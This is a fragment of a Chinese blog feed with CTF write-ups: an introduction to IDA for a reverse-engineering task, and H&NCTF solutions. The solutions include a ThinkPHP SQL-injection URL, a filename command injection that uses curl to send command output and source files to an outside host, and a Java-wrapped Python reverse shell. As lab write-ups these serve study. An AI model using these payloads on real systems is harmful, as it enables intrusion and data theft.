        <content type="html"><![CDATA[<p>BUUCTF reverse1</p><p>学习要领：<br>1.使用IDA打开文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.点击New打开新文件</span><br><span class="line">2.点击Go,把可执行文件拖进IDA</span><br><span class="line">注：不同版本要用对应的32或64位打开，可以尝试，因为它要么32位，要么64位</span><br></pre></td></tr></table></figure><p>2.IDA窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">01.反汇编窗口</span><br><span class="line">  是图形化界面，一般可以通过这个界面快速了解程序的执行过程</span><br><span class="line">02.字符串窗口</span><br><span class="line">  使用shift+F12打开，打开字符串窗口，可以看到里面的字符串</span><br></pre></td></tr></table></figure><p><img src="/2024/05/20/%E5%88%9D%E8%AF%86re/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240520165302704.png" alt="image-20240520165302704"></p><p>3.反编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在反汇编窗口使用fn+F5实现反汇编功能，即将汇编语言反向编译为伪C语言</span><br></pre></td></tr></table></figure><p>现在看题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.打开exe文件</span><br><span class="line">2.shift+F12查看字符串</span><br><span class="line">3.跟进，双击“this is the right flag”,发现右下角有DATA XREF，它的地址，点击进入，看到流程图</span><br></pre></td></tr></table></figure><p><img src="/2024/05/20/%E5%88%9D%E8%AF%86re/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240520171559490.png" alt="image-20240520171559490"></p><p><img src="/2024/05/20/%E5%88%9D%E8%AF%86re/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240520171757295.png" alt="image-20240520171757295"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.fn+F5,反汇编，得到伪C语言，进行审计代码</span><br></pre></td></tr></table></figure><p><img src="/2024/05/20/%E5%88%9D%E8%AF%86re/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240520172204541.png" alt="image-20240520172204541"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>H&amp;NCTF复现</title>
      <link href="/2024/05/19/H-NCTF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/05/19/H-NCTF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h4><p>有点没理解，以后有能力了再做做吧</p><p>在原版thinkphp3.2.3中，删除了think_filter过滤的exp，使得我们可以利用</p><p>在ThinkPHP\Library\Think\Db\Driver.class.php中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(is_array($val)) &#123;</span><br><span class="line">...</span><br><span class="line">elseif(&#x27;exp&#x27; == $exp )&#123;</span><br><span class="line">$whereStr .= $key.&#x27; &#x27;.$val[1];</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用exp时，需要手动添加等号，再配合union select，即可获得flag</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/home/index/h_n?name[0]=exp&amp;name[1]=%3d%27test123%27%20union%20select%201,flag%20from%20flag</span><br></pre></td></tr></table></figure><p>注意，cookie可能会匹配某些过滤，删除即可</p><p><img src="/2024/05/19/H-NCTF%E5%A4%8D%E7%8E%B0/Users\史小乐\AppData\Local\Temp\AgAABbWKMDsWNdOkNjhBh7wNdbPFULoV.png" alt="AgAABbWKMDsWNdOkNjhBh7wNdbPFULoV"></p><h2 id><a href="#" class="headerlink" title></a></h2><h4 id="GoJava"><a href="#GoJava" class="headerlink" title="GoJava"></a>GoJava</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题面</span><br><span class="line">moran 凭借自己一坤天的代码学习，写了一个简单的在线 java 编译器，快来试试吧！</span><br><span class="line">tips:编译需要时间，请耐心等待</span><br><span class="line">flag在/root里。另外请细心寻找</span><br></pre></td></tr></table></figure><p>1.信息泄露了两个文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">robots.txt</span><br><span class="line">js</span><br></pre></td></tr></table></figure><p>访问robots.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: ./main-old.zip  可以看</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: ./main.go  看不了，被ban了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;io&quot;</span><br><span class="line">&quot;log&quot;</span><br><span class="line">&quot;mime/multipart&quot;</span><br><span class="line">&quot;net/http&quot;</span><br><span class="line">&quot;os&quot;</span><br><span class="line">&quot;strings&quot;</span><br><span class="line">)</span><br><span class="line">var blacklistChars = []rune&#123;&#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&quot;&#x27;, &#x27;\&#x27;&#x27;, &#x27;\\&#x27;, &#x27;?&#x27;, &#x27;*&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\r&#x27;&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">// 设置路由</span><br><span class="line">http.HandleFunc(&quot;/gojava&quot;, compileJava)</span><br><span class="line"></span><br><span class="line">// 设置静态文件服务器</span><br><span class="line">fs := http.FileServer(http.Dir(&quot;.&quot;))</span><br><span class="line">http.Handle(&quot;/&quot;, fs)</span><br><span class="line"></span><br><span class="line">// 启动服务器</span><br><span class="line">log.Println(&quot;Server started on :80&quot;)</span><br><span class="line">log.Fatal(http.ListenAndServe(&quot;:80&quot;, nil))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func isFilenameBlacklisted(filename string) bool &#123;</span><br><span class="line">for _, char := range filename &#123;</span><br><span class="line">for _, blackChar := range blacklistChars &#123;</span><br><span class="line">if char == blackChar &#123;</span><br><span class="line">return true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func compileJava(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">// 检查请求方法是否为POST</span><br><span class="line">if r.Method != http.MethodPost &#123;</span><br><span class="line">http.Error(w, &quot;Method not allowed&quot;, http.StatusMethodNotAllowed)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 解析multipart/form-data格式的表单数据</span><br><span class="line">err := r.ParseMultipartForm(10 &lt;&lt; 20) // 设置最大文件大小为10MB</span><br><span class="line">if err != nil &#123;</span><br><span class="line">http.Error(w, &quot;Error parsing form&quot;, http.StatusInternalServerError)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 从表单中获取上传的文件</span><br><span class="line">file, handler, err := r.FormFile(&quot;file&quot;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">http.Error(w, &quot;Error retrieving file&quot;, http.StatusBadRequest)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">defer file.Close()</span><br><span class="line"></span><br><span class="line">if isFilenameBlacklisted(handler.Filename) &#123;</span><br><span class="line">http.Error(w, &quot;Invalid filename: contains blacklisted character&quot;, http.StatusBadRequest)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">if !strings.HasSuffix(handler.Filename, &quot;.java&quot;) &#123;</span><br><span class="line">http.Error(w, &quot;Invalid file format, please select a .java file&quot;, http.StatusBadRequest)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">err = saveFile(file, &quot;./upload/&quot;+handler.Filename)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">http.Error(w, &quot;Error saving file&quot;, http.StatusInternalServerError)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func saveFile(file multipart.File, filePath string) error &#123;</span><br><span class="line">// 创建目标文件</span><br><span class="line">f, err := os.Create(filePath)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">return err</span><br><span class="line">&#125;</span><br><span class="line">defer f.Close()</span><br><span class="line"></span><br><span class="line">// 将上传的文件内容复制到目标文件中</span><br><span class="line">_, err = io.Copy(f, file)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">return err</span><br><span class="line">&#125;</span><br><span class="line">return nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到对上传的文件名是有过滤的，我们可以尝试用文件名进行RCE</p><p>但是我没弹过来😿🥹🥹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryujTPRyD0Ol0dP4y8</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.java||curl -X POST -d a=`whoami` [IP]:4444||.java&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryujTPRyD0Ol0dP4y8--</span><br><span class="line">看文件夹</span><br><span class="line">a.java||curl -X POST -d a=`ls|base64 -w 0` [IP]:4444||.java</span><br><span class="line"></span><br><span class="line">Y3NzCmZpbmFsCmdvLm1vZApnb2phdmEKaW5kZXguaHRtbApqcwptYWluLW9sZC56aXAKbWFpbi5nbwpyb2JvdHMudHh0CnVwbG9hZAo=</span><br><span class="line"> 解码得到</span><br><span class="line">css</span><br><span class="line">final</span><br><span class="line">go.mod</span><br><span class="line">gojava</span><br><span class="line">index.html</span><br><span class="line">js</span><br><span class="line">main-old.zip</span><br><span class="line">main.go</span><br><span class="line">robots.txt</span><br><span class="line">upload</span><br><span class="line"></span><br><span class="line">拿一下main.go</span><br><span class="line">a.java||curl -X POST -d a=`base64 -w 0 main.go` [IP]:4444||.java</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line">import (</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;io&quot;</span><br><span class="line">    &quot;log&quot;</span><br><span class="line">    &quot;math/rand&quot;</span><br><span class="line">    &quot;mime/multipart&quot;</span><br><span class="line">    &quot;net/http&quot;</span><br><span class="line">    &quot;os&quot;</span><br><span class="line">    &quot;os/exec&quot;</span><br><span class="line">    &quot;path/filepath&quot;</span><br><span class="line">    &quot;strconv&quot;</span><br><span class="line">    &quot;strings&quot;</span><br><span class="line">    &quot;time&quot;</span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line">var blacklistChars = []rune&#123;&#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&quot;&#x27;, &#x27;\&#x27;&#x27;, &#x27;\\&#x27;, &#x27;?&#x27;, &#x27;*&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\r&#x27;&#125;</span><br><span class="line"> </span><br><span class="line">func main() &#123;</span><br><span class="line">    // 设置路由</span><br><span class="line">    http.HandleFunc(&quot;/gojava&quot;, compileJava)</span><br><span class="line">    http.HandleFunc(&quot;/testExecYourJarOnServer&quot;, testExecYourJarOnServer)</span><br><span class="line"> </span><br><span class="line">    // 设置静态文件服务器</span><br><span class="line">    fs := http.FileServer(http.Dir(&quot;.&quot;))</span><br><span class="line">    http.Handle(&quot;/&quot;, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">        // 检查请求的路径是否需要被禁止访问</span><br><span class="line">        if isForbiddenPath(r.URL.Path) &#123;</span><br><span class="line">            http.Error(w, &quot;Forbidden&quot;, http.StatusForbidden)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        // 否则，继续处理其他请求</span><br><span class="line">        fs.ServeHTTP(w, r)</span><br><span class="line">    &#125;))</span><br><span class="line"> </span><br><span class="line">    // 启动服务器</span><br><span class="line">    log.Println(&quot;Server started on :80&quot;)</span><br><span class="line">    log.Fatal(http.ListenAndServe(&quot;:80&quot;, nil))</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">func isForbiddenPath(path string) bool &#123;</span><br><span class="line">    // 检查路径是否为某个特定文件或文件夹的路径</span><br><span class="line">    // 这里可以根据你的需求进行设置</span><br><span class="line">    forbiddenPaths := []string&#123;</span><br><span class="line">        &quot;/main.go&quot;,</span><br><span class="line">        &quot;/upload/&quot;,</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 检查请求的路径是否与禁止访问的路径匹配</span><br><span class="line">    for _, forbiddenPath := range forbiddenPaths &#123;</span><br><span class="line">        if strings.HasPrefix(path, forbiddenPath) &#123;</span><br><span class="line">            return true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">func isFilenameBlacklisted(filename string) bool &#123;</span><br><span class="line">    for _, char := range filename &#123;</span><br><span class="line">        for _, blackChar := range blacklistChars &#123;</span><br><span class="line">            if char == blackChar &#123;</span><br><span class="line">                return true</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">// compileJava 处理上传并编译Java文件的请求</span><br><span class="line">func compileJava(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    // 检查请求方法是否为POST</span><br><span class="line">    if r.Method != http.MethodPost &#123;</span><br><span class="line">        http.Error(w, &quot;Method not allowed&quot;, http.StatusMethodNotAllowed)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 解析multipart/form-data格式的表单数据</span><br><span class="line">    err := r.ParseMultipartForm(10 &lt;&lt; 20) // 设置最大文件大小为10MB</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error parsing form&quot;, http.StatusInternalServerError)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 从表单中获取上传的文件</span><br><span class="line">    file, handler, err := r.FormFile(&quot;file&quot;)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error retrieving file&quot;, http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    defer file.Close()</span><br><span class="line"> </span><br><span class="line">    if isFilenameBlacklisted(handler.Filename) &#123;</span><br><span class="line">        http.Error(w, &quot;Invalid filename: contains blacklisted character&quot;, http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 检查文件扩展名是否为.java</span><br><span class="line">    if !strings.HasSuffix(handler.Filename, &quot;.java&quot;) &#123;</span><br><span class="line">        http.Error(w, &quot;Invalid file format, please select a .java file&quot;, http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 保存上传的文件至./upload文件夹</span><br><span class="line">    err = saveFile(file, &quot;./upload/&quot;+handler.Filename)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error saving file&quot;, http.StatusInternalServerError)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 生成随机文件名</span><br><span class="line">    rand.Seed(time.Now().UnixNano())</span><br><span class="line">    randomName := strconv.FormatInt(rand.Int63(), 16) + &quot;.jar&quot;</span><br><span class="line"> </span><br><span class="line">    // 编译Java文件</span><br><span class="line">    cmd := &quot;javac ./upload/&quot; + handler.Filename</span><br><span class="line">    compileCmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, cmd)</span><br><span class="line">    //compileCmd := exec.Command(&quot;javac&quot;, &quot;./upload/&quot;+handler.Filename)</span><br><span class="line">    compileOutput, err := compileCmd.CombinedOutput()</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error compiling Java file: &quot;+string(compileOutput), http.StatusInternalServerError)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 将编译后的.class文件打包成.jar文件</span><br><span class="line">    fileNameWithoutExtension := strings.TrimSuffix(handler.Filename, filepath.Ext(handler.Filename))</span><br><span class="line">    jarCmd := exec.Command(&quot;jar&quot;, &quot;cvfe&quot;, &quot;./final/&quot;+randomName, fileNameWithoutExtension, &quot;-C&quot;, &quot;./upload&quot;, strings.TrimSuffix(handler.Filename, &quot;.java&quot;)+&quot;.class&quot;)</span><br><span class="line">    jarOutput, err := jarCmd.CombinedOutput()</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error creating JAR file: &quot;+string(jarOutput), http.StatusInternalServerError)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 返回编译后的.jar文件的下载链接</span><br><span class="line">    fmt.Fprintf(w, &quot;/final/%s&quot;, randomName)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">// saveFile 保存上传的文件</span><br><span class="line">func saveFile(file multipart.File, filePath string) error &#123;</span><br><span class="line">    // 创建目标文件</span><br><span class="line">    f, err := os.Create(filePath)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        return err</span><br><span class="line">    &#125;</span><br><span class="line">    defer f.Close()</span><br><span class="line"> </span><br><span class="line">    // 将上传的文件内容复制到目标文件中</span><br><span class="line">    _, err = io.Copy(f, file)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        return err</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    return nil</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">func testExecYourJarOnServer(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    jarFile := &quot;./final/&quot; + r.URL.Query().Get(&quot;jar&quot;)</span><br><span class="line"> </span><br><span class="line">    // 检查是否存在指定的.jar文件</span><br><span class="line">    if !strings.HasSuffix(jarFile, &quot;.jar&quot;) &#123;</span><br><span class="line">        http.Error(w, &quot;Invalid jar file format&quot;, http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if _, err := os.Stat(jarFile); os.IsNotExist(err) &#123;</span><br><span class="line">        http.Error(w, &quot;Jar file not found&quot;, http.StatusNotFound)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 执行.jar文件</span><br><span class="line">    cmd := exec.Command(&quot;java&quot;, &quot;-jar&quot;, jarFile)</span><br><span class="line">    output, err := cmd.CombinedOutput()</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error running jar file: &quot;+string(output), http.StatusInternalServerError)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 输出结果</span><br><span class="line">    w.Header().Set(&quot;Content-Type&quot;, &quot;text/plain&quot;)</span><br><span class="line">    w.Write(output)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> 可以发现有一个接口testExecYourJarOnServer用于在服务器上运行jar文件，可以构造java代码</span><br><span class="line"># ExecuteSystemCommand.java</span><br><span class="line"></span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class ExecuteSystemCommand &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String[] cmd = &#123; &quot;python3&quot;, &quot;-c&quot;,</span><br><span class="line">                &quot;import os,pty,socket;s=socket.socket();s.connect((\&quot;[IP]\&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&quot;bash\&quot;)&quot; &#125;;</span><br><span class="line"></span><br><span class="line">        ProcessBuilder processBuilder = new ProcessBuilder(cmd);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Process process = processBuilder.start();</span><br><span class="line"></span><br><span class="line">            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            while ((line = reader.readLine()) != null) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            int exitCode = process.waitFor();</span><br><span class="line">            System.out.println(&quot;Exited with code: &quot; + exitCode);</span><br><span class="line">        &#125; catch (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;访问接口</span><br><span class="line">http://hnctf.imxbt.cn:27984/testExecYourJarOnServer?jar=429e7d2610c50acb.jar成功拿到shell</span><br><span class="line">在根目录可以找到/memorandum文件，翻译是备忘录</span><br><span class="line">cat /memorandum        </span><br><span class="line">AsdDABG</span><br><span class="line">猜测是密码，尝试登录</span><br><span class="line">su</span><br><span class="line">Password  AsdDABG</span><br><span class="line">登录成功，拿flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Start</title>
      <link href="/2024/05/19/Start/"/>
      <url>/2024/05/19/Start/</url>
      
